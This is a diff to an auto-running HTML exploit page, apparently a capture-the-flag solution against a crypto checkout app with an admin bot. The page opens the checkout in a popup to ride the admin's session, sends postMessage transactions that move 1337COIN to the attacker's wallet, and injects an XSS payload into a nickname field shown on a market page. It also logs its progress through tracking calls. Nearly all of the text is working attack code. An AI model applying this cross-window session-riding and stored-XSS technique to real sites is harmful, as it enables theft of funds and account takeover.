@@ -1,6 +1,8 @@
-</html>
+<!DOCTYPE html>
+<html>
 <head>
-    <title>XXS POC</title>
+    <title>XSS Exploit</title>
+    <meta charset="UTF-8">
 </head>
 <body>
     <h1>EXPLOIT LOADED</h1>
@@ -31,9 +33,11 @@
             log('Starting XSS exploit via postMessage...', 'info');
             track('start', 'admin_visited_exploit', { wallet: YOUR_WALLET });
 
-            // Open checkout.html in popup - inherits admin session via SameSite=Lax
-            const checkoutUrl = `${BASE}/checkout.html?currency=1337COIN&price=1337`;
-            log(`Opening checkout in popup...`, 'info');
+            // Admin bot HAS 1337COIN wallet (per docs)
+            // checkout.html:311 loads userWallets from /api/wallets
+            // We need to wait for init() to complete before sending postMessage
+            const checkoutUrl = `${BASE}/checkout.html?currency=1337COIN&price=1`;
+            log(`Opening checkout in popup (admin has 1337COIN wallet)...`, 'info');
 
             const popup = window.open(checkoutUrl, 'checkout', 'width=1000,height=800');
 
@@ -46,13 +50,19 @@
             log('Popup opened - admin session inherited', 'success');
             track('popup_opened', 'success', {});
 
-            // Wait for popup to load, then send malicious postMessage
-            // We need to send TWO transactions
-
+            // CRITICAL: Wait for popup's init() to load userWallets from /api/wallets
+            // checkout.html:311-316 fetches wallets asynchronously
             setTimeout(async () => {
+                // First, send a ping to verify popup is ready
+                log('Pinging popup to verify readiness...', 'info');
+                popup.postMessage({ type: 'ping' }, '*');
+
+                // Wait a bit for response, then send transactions
+                await new Promise(r => setTimeout(r, 1000));
+
                 // Transaction 1: Send 1337COIN to your wallet
                 log('Sending TX #1: 1337COIN to ' + YOUR_WALLET, 'info');
-                track('tx1_start', 'sending_coins', { to: YOUR_WALLET });
+                track('tx1_start', 'sending_coins', { to: YOUR_WALLET, currency: '1337COIN' });
 
                 popup.postMessage({
                     type: 'submitTransaction',
@@ -65,10 +75,10 @@
                 }, '*');
 
                 log('TX #1 sent via postMessage', 'success');
-                track('tx1_sent', 'postMessage_sent', { to: YOUR_WALLET });
+                track('tx1_sent', 'postMessage_sent', { to: YOUR_WALLET, currency: '1337COIN' });
 
-                // Wait a bit, then send TX #2
-                await new Promise(r => setTimeout(r, 1500));
+                // Wait for transaction to process, then send TX #2
+                await new Promise(r => setTimeout(r, 2000));
 
                 // Transaction 2: Send 1337COIN to xss-payload with XSS in nickname
                 log('Sending TX #2: XSS payload injection...', 'info');
@@ -87,7 +97,8 @@
                 log('TX #2 sent - XSS injected in nickname!', 'success');
                 track('tx2_sent', 'xss_injected', {
                     payload: XSS_PAYLOAD,
-                    trigger: 'marketwatch_nickname_field'
+                    trigger: 'marketwatch_nickname_field',
+                    currency: '1337COIN'
                 });
 
                 // Final tracking
@@ -104,7 +115,7 @@
                 log('When admin visits marketwatch.html:', 'info');
                 log('  XSS will trigger: alert("gigawatz")', 'success');
 
-            }, 3000);
+            }, 5000);  // Increased from 3000ms to 5000ms for wallet loading
 
             // Close popup after completion
             setTimeout(() => {
@@ -114,6 +125,12 @@
                 }
             }, 8000);
         }
+
+        // Listen for messages from popup (for debugging)
+        window.addEventListener('message', (event) => {
+            log('Received message from popup: ' + JSON.stringify(event.data), 'info');
+            track('popup_message', 'received', { data: event.data });
+        });
 
         // Auto-execute on page load
         window.addEventListener('load', () => {
